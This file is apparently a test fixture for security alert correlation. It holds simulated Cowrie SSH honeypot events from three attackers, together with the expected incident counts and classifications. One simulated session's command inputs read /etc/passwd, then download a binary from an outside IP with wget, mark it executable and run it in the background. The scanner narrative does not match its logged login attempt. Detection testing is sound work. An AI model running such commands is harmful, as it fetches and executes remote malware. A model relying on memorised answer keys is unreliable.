@@ -1,0 +1,271 @@
+{
+  "description": "Multi-attacker honeypot scenario: 3 distinct attackers hitting the Cowrie SSH honeypot simultaneously from different IPs with different session IDs. Attacker A (91.189.114.22): automated bot doing 3 failed logins then disconnect. Attacker B (185.220.101.45): human attacker — brute force → success → command exec → malware download. Attacker C (45.33.32.156): Shodan-style scanner — connect and fingerprint only. Expected: 3 incidents, each session-isolated.",
+  "expected_incidents": 3,
+  "expected_severity": "critical",
+  "expected_classification": "account_compromise",
+  "correlation_notes": {
+    "chain_1_bot": {
+      "alerts": ["mah_a01", "mah_a02", "mah_a03", "mah_a04"],
+      "correlation_signals": ["same_session:sess_bot_a1a1", "same_source_ip:91.189.114.22", "time_within_5m"],
+      "expected_classification": "brute_force_attempt",
+      "narrative": "Automated Mirai-variant bot: connect → rapid credential spray → disconnect. No interaction."
+    },
+    "chain_2_human": {
+      "alerts": ["mah_b01", "mah_b02", "mah_b03", "mah_b04", "mah_b05", "mah_b06", "mah_b07", "mah_b08"],
+      "correlation_signals": ["same_session:sess_human_b2b2", "same_source_ip:185.220.101.45", "time_within_5m", "mitre_chain:T1110→T1078→T1059→T1105"],
+      "expected_classification": "account_compromise",
+      "narrative": "Human attacker: methodical brute force → successful login → environment recon → credential harvesting → malware download → persistence"
+    },
+    "chain_3_scanner": {
+      "alerts": ["mah_c01", "mah_c02", "mah_c03"],
+      "correlation_signals": ["same_session:sess_scan_c3c3", "same_source_ip:45.33.32.156", "time_within_5m"],
+      "expected_classification": "reconnaissance",
+      "narrative": "Shodan/Censys scanner: connect → SSH version probe → disconnect. Passive reconnaissance only."
+    }
+  },
+  "alerts": [
+    {
+      "source_family": "siem",
+      "source_type": "cowrie_splunk",
+      "external_alert_id": "mah_a01",
+      "event_time": "2026-04-09T06:00:00.000Z",
+      "payload": {
+        "eventid": "cowrie.session.connect",
+        "timestamp": "2026-04-09T06:00:00.000Z",
+        "src_ip": "91.189.114.22",
+        "src_port": 55100,
+        "dst_ip": "10.0.1.10",
+        "dst_port": 2222,
+        "session": "sess_bot_a1a1",
+        "sensor": "svr04",
+        "protocol": "ssh"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "cowrie_splunk",
+      "external_alert_id": "mah_a02",
+      "event_time": "2026-04-09T06:00:02.000Z",
+      "payload": {
+        "eventid": "cowrie.login.failed",
+        "timestamp": "2026-04-09T06:00:02.000Z",
+        "src_ip": "91.189.114.22",
+        "src_port": 55100,
+        "dst_ip": "10.0.1.10",
+        "dst_port": 2222,
+        "username": "root",
+        "password": "admin",
+        "session": "sess_bot_a1a1",
+        "sensor": "svr04",
+        "protocol": "ssh"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "cowrie_splunk",
+      "external_alert_id": "mah_a03",
+      "event_time": "2026-04-09T06:00:04.000Z",
+      "payload": {
+        "eventid": "cowrie.login.failed",
+        "timestamp": "2026-04-09T06:00:04.000Z",
+        "src_ip": "91.189.114.22",
+        "src_port": 55100,
+        "username": "root",
+        "password": "123456",
+        "session": "sess_bot_a1a1",
+        "sensor": "svr04",
+        "protocol": "ssh"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "cowrie_splunk",
+      "external_alert_id": "mah_a04",
+      "event_time": "2026-04-09T06:00:06.000Z",
+      "payload": {
+        "eventid": "cowrie.login.failed",
+        "timestamp": "2026-04-09T06:00:06.000Z",
+        "src_ip": "91.189.114.22",
+        "src_port": 55100,
+        "username": "admin",
+        "password": "admin",
+        "session": "sess_bot_a1a1",
+        "sensor": "svr04",
+        "protocol": "ssh"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "cowrie_splunk",
+      "external_alert_id": "mah_b01",
+      "event_time": "2026-04-09T06:01:00.000Z",
+      "payload": {
+        "eventid": "cowrie.session.connect",
+        "timestamp": "2026-04-09T06:01:00.000Z",
+        "src_ip": "185.220.101.45",
+        "src_port": 48392,
+        "dst_ip": "10.0.1.10",
+        "dst_port": 2222,
+        "session": "sess_human_b2b2",
+        "sensor": "svr04",
+        "protocol": "ssh"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "cowrie_splunk",
+      "external_alert_id": "mah_b02",
+      "event_time": "2026-04-09T06:01:15.000Z",
+      "payload": {
+        "eventid": "cowrie.login.failed",
+        "timestamp": "2026-04-09T06:01:15.000Z",
+        "src_ip": "185.220.101.45",
+        "src_port": 48392,
+        "username": "root",
+        "password": "toor",
+        "session": "sess_human_b2b2",
+        "sensor": "svr04",
+        "protocol": "ssh"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "cowrie_splunk",
+      "external_alert_id": "mah_b03",
+      "event_time": "2026-04-09T06:01:30.000Z",
+      "payload": {
+        "eventid": "cowrie.login.failed",
+        "timestamp": "2026-04-09T06:01:30.000Z",
+        "src_ip": "185.220.101.45",
+        "src_port": 48392,
+        "username": "root",
+        "password": "password123",
+        "session": "sess_human_b2b2",
+        "sensor": "svr04",
+        "protocol": "ssh"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "cowrie_splunk",
+      "external_alert_id": "mah_b04",
+      "event_time": "2026-04-09T06:02:00.000Z",
+      "payload": {
+        "eventid": "cowrie.login.success",
+        "timestamp": "2026-04-09T06:02:00.000Z",
+        "src_ip": "185.220.101.45",
+        "src_port": 48392,
+        "username": "root",
+        "password": "root",
+        "session": "sess_human_b2b2",
+        "sensor": "svr04",
+        "protocol": "ssh"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "cowrie_splunk",
+      "external_alert_id": "mah_b05",
+      "event_time": "2026-04-09T06:02:15.000Z",
+      "payload": {
+        "eventid": "cowrie.command.input",
+        "timestamp": "2026-04-09T06:02:15.000Z",
+        "src_ip": "185.220.101.45",
+        "session": "sess_human_b2b2",
+        "input": "uname -a; id; cat /etc/passwd",
+        "sensor": "svr04"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "cowrie_splunk",
+      "external_alert_id": "mah_b06",
+      "event_time": "2026-04-09T06:02:45.000Z",
+      "payload": {
+        "eventid": "cowrie.command.input",
+        "timestamp": "2026-04-09T06:02:45.000Z",
+        "src_ip": "185.220.101.45",
+        "session": "sess_human_b2b2",
+        "input": "wget http://45.95.168.33/x86_64.elf -O /tmp/.x86; chmod +x /tmp/.x86",
+        "sensor": "svr04"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "cowrie_splunk",
+      "external_alert_id": "mah_b07",
+      "event_time": "2026-04-09T06:02:50.000Z",
+      "payload": {
+        "eventid": "cowrie.session.file_download",
+        "timestamp": "2026-04-09T06:02:50.000Z",
+        "src_ip": "185.220.101.45",
+        "session": "sess_human_b2b2",
+        "url": "http://45.95.168.33/x86_64.elf",
+        "shasum": "a7f1e5b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0",
+        "sensor": "svr04"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "cowrie_splunk",
+      "external_alert_id": "mah_b08",
+      "event_time": "2026-04-09T06:03:00.000Z",
+      "payload": {
+        "eventid": "cowrie.command.input",
+        "timestamp": "2026-04-09T06:03:00.000Z",
+        "src_ip": "185.220.101.45",
+        "session": "sess_human_b2b2",
+        "input": "/tmp/.x86; nohup /tmp/.x86 &",
+        "sensor": "svr04"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "cowrie_splunk",
+      "external_alert_id": "mah_c01",
+      "event_time": "2026-04-09T06:00:30.000Z",
+      "payload": {
+        "eventid": "cowrie.session.connect",
+        "timestamp": "2026-04-09T06:00:30.000Z",
+        "src_ip": "45.33.32.156",
+        "src_port": 60200,
+        "dst_ip": "10.0.1.10",
+        "dst_port": 2222,
+        "session": "sess_scan_c3c3",
+        "sensor": "svr04",
+        "protocol": "ssh"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "cowrie_splunk",
+      "external_alert_id": "mah_c02",
+      "event_time": "2026-04-09T06:00:31.000Z",
+      "payload": {
+        "eventid": "cowrie.client.version",
+        "timestamp": "2026-04-09T06:00:31.000Z",
+        "src_ip": "45.33.32.156",
+        "session": "sess_scan_c3c3",
+        "version": "SSH-2.0-Go",
+        "sensor": "svr04"
+      }
+    },
+    {
+      "source_family": "siem",
+      "source_type": "cowrie_splunk",
+      "external_alert_id": "mah_c03",
+      "event_time": "2026-04-09T06:00:35.000Z",
+      "payload": {
+        "eventid": "cowrie.login.failed",
+        "timestamp": "2026-04-09T06:00:35.000Z",
+        "src_ip": "45.33.32.156",
+        "src_port": 60200,
+        "username": "root",
+        "password": "root",
+        "session": "sess_scan_c3c3",
+        "sensor": "svr04",
+        "protocol": "ssh"
+      }
+    }
+  ]
+}
